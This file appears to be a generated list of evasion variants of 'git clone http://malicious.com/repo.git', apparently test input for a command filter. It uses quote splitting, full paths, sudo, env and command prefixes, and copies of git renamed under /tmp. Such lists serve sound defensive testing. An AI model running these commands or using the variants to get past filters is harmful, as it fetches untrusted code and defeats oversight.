"git"  clone http://malicious.com/repo.git
"git" clone http://malicious.com/repo.git
"git"clone http://malicious.com/repo.git
'git'  clone http://malicious.com/repo.git
'git' clone http://malicious.com/repo.git
'git'clone http://malicious.com/repo.git
/bin/"git"  clone http://malicious.com/repo.git
/bin/"git" clone http://malicious.com/repo.git
/bin/"git"clone http://malicious.com/repo.git
/bin/'git'  clone http://malicious.com/repo.git
/bin/'git' clone http://malicious.com/repo.git
/bin/'git'clone http://malicious.com/repo.git
/bin/g""it  clone http://malicious.com/repo.git
/bin/g""it clone http://malicious.com/repo.git
/bin/g""itclone http://malicious.com/repo.git
/bin/g''it  clone http://malicious.com/repo.git
/bin/g''it clone http://malicious.com/repo.git
/bin/g''itclone http://malicious.com/repo.git
/bin/git  clone http://malicious.com/repo.git
/bin/git clone http://malicious.com/repo.git
/bin/gitclone http://malicious.com/repo.git
/usr/bin/"git"  clone http://malicious.com/repo.git
/usr/bin/"git" clone http://malicious.com/repo.git
/usr/bin/"git"clone http://malicious.com/repo.git
/usr/bin/'git'  clone http://malicious.com/repo.git
/usr/bin/'git' clone http://malicious.com/repo.git
/usr/bin/'git'clone http://malicious.com/repo.git
/usr/bin/g""it  clone http://malicious.com/repo.git
/usr/bin/g""it clone http://malicious.com/repo.git
/usr/bin/g""itclone http://malicious.com/repo.git
/usr/bin/g''it  clone http://malicious.com/repo.git
/usr/bin/g''it clone http://malicious.com/repo.git
/usr/bin/g''itclone http://malicious.com/repo.git
/usr/bin/git  clone http://malicious.com/repo.git
/usr/bin/git clone http://malicious.com/repo.git
/usr/bin/gitclone http://malicious.com/repo.git
command "git"  clone http://malicious.com/repo.git
command "git" clone http://malicious.com/repo.git
command "git"clone http://malicious.com/repo.git
command 'git'  clone http://malicious.com/repo.git
command 'git' clone http://malicious.com/repo.git
command 'git'clone http://malicious.com/repo.git
command g""it  clone http://malicious.com/repo.git
command g""it clone http://malicious.com/repo.git
command g""itclone http://malicious.com/repo.git
command g''it  clone http://malicious.com/repo.git
command g''it clone http://malicious.com/repo.git
command g''itclone http://malicious.com/repo.git
command git  clone http://malicious.com/repo.git
command git clone http://malicious.com/repo.git
command gitclone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_37 && /tmp/tmp_bin_37 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_38 && /tmp/tmp_bin_38 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_39 && /tmp/tmp_bin_39 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_4 && /tmp/tmp_bin_4 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_40 && /tmp/tmp_bin_40 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_41 && /tmp/tmp_bin_41 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_42 && /tmp/tmp_bin_42 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_43 && /tmp/tmp_bin_43 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_44 && /tmp/tmp_bin_44 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_45 && /tmp/tmp_bin_45 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_46 && /tmp/tmp_bin_46 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_47 && /tmp/tmp_bin_47 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_48 && /tmp/tmp_bin_48 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_49 && /tmp/tmp_bin_49 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_5 && /tmp/tmp_bin_5 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_50 && /tmp/tmp_bin_50 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_51 && /tmp/tmp_bin_51 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_52 && /tmp/tmp_bin_52 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_53 && /tmp/tmp_bin_53 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_54 && /tmp/tmp_bin_54 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_55 && /tmp/tmp_bin_55 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_56 && /tmp/tmp_bin_56 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_57 && /tmp/tmp_bin_57 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_58 && /tmp/tmp_bin_58 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_59 && /tmp/tmp_bin_59 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_6 && /tmp/tmp_bin_6 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_60 && /tmp/tmp_bin_60 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_61 && /tmp/tmp_bin_61 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_62 && /tmp/tmp_bin_62 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_63 && /tmp/tmp_bin_63 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_64 && /tmp/tmp_bin_64 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_65 && /tmp/tmp_bin_65 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_66 && /tmp/tmp_bin_66 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_67 && /tmp/tmp_bin_67 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_68 && /tmp/tmp_bin_68 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_69 && /tmp/tmp_bin_69 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_7 && /tmp/tmp_bin_7 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_70 && /tmp/tmp_bin_70 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_71 && /tmp/tmp_bin_71 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_72 && /tmp/tmp_bin_72 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_73 && /tmp/tmp_bin_73 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_74 && /tmp/tmp_bin_74 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_75 && /tmp/tmp_bin_75 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_76 && /tmp/tmp_bin_76 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_77 && /tmp/tmp_bin_77 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_78 && /tmp/tmp_bin_78 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_79 && /tmp/tmp_bin_79 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_8 && /tmp/tmp_bin_8 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_80 && /tmp/tmp_bin_80 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_81 && /tmp/tmp_bin_81 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_82 && /tmp/tmp_bin_82 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_83 && /tmp/tmp_bin_83 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_84 && /tmp/tmp_bin_84 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_85 && /tmp/tmp_bin_85 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_86 && /tmp/tmp_bin_86 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_87 && /tmp/tmp_bin_87 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_88 && /tmp/tmp_bin_88 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_89 && /tmp/tmp_bin_89 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_9 && /tmp/tmp_bin_9 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_90 && /tmp/tmp_bin_90 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_91 && /tmp/tmp_bin_91 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_92 && /tmp/tmp_bin_92 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_93 && /tmp/tmp_bin_93 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_94 && /tmp/tmp_bin_94 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_95 && /tmp/tmp_bin_95 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_96 && /tmp/tmp_bin_96 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_97 && /tmp/tmp_bin_97 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_98 && /tmp/tmp_bin_98 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_99 && /tmp/tmp_bin_99 clone http://malicious.com/repo.git
env "git"  clone http://malicious.com/repo.git
env "git" clone http://malicious.com/repo.git
env "git"clone http://malicious.com/repo.git
env 'git'  clone http://malicious.com/repo.git
env 'git' clone http://malicious.com/repo.git
env 'git'clone http://malicious.com/repo.git
env -i "git"  clone http://malicious.com/repo.git
env -i "git" clone http://malicious.com/repo.git
env -i "git"clone http://malicious.com/repo.git
env -i 'git'  clone http://malicious.com/repo.git
env -i 'git' clone http://malicious.com/repo.git
env -i 'git'clone http://malicious.com/repo.git
env -i g""it  clone http://malicious.com/repo.git
env -i g""it clone http://malicious.com/repo.git
env -i g""itclone http://malicious.com/repo.git
env -i g''it  clone http://malicious.com/repo.git
env -i g''it clone http://malicious.com/repo.git
env -i g''itclone http://malicious.com/repo.git
env -i git  clone http://malicious.com/repo.git
env -i git clone http://malicious.com/repo.git
env -i gitclone http://malicious.com/repo.git
env g""it  clone http://malicious.com/repo.git
env g""it clone http://malicious.com/repo.git
env g""itclone http://malicious.com/repo.git
env g''it  clone http://malicious.com/repo.git
env g''it clone http://malicious.com/repo.git
env g''itclone http://malicious.com/repo.git
env git  clone http://malicious.com/repo.git
env git clone http://malicious.com/repo.git
env gitclone http://malicious.com/repo.git
g""it  clone http://malicious.com/repo.git
g""it clone http://malicious.com/repo.git
g""itclone http://malicious.com/repo.git
g''it  clone http://malicious.com/repo.git
g''it clone http://malicious.com/repo.git
g''itclone http://malicious.com/repo.git
git  clone http://malicious.com/repo.git
git clone http://malicious.com/repo.git
gitclone http://malicious.com/repo.git
sudo "git"  clone http://malicious.com/repo.git
sudo "git" clone http://malicious.com/repo.git
sudo "git"clone http://malicious.com/repo.git
sudo 'git'  clone http://malicious.com/repo.git
sudo 'git' clone http://malicious.com/repo.git
sudo 'git'clone http://malicious.com/repo.git
sudo g""it  clone http://malicious.com/repo.git
sudo g""it clone http://malicious.com/repo.git
sudo g""itclone http://malicious.com/repo.git
sudo g''it  clone http://malicious.com/repo.git
sudo g''it clone http://malicious.com/repo.git
sudo g''itclone http://malicious.com/repo.git
sudo git  clone http://malicious.com/repo.git
sudo git clone http://malicious.com/repo.git
sudo gitclone http://malicious.com/repo.git
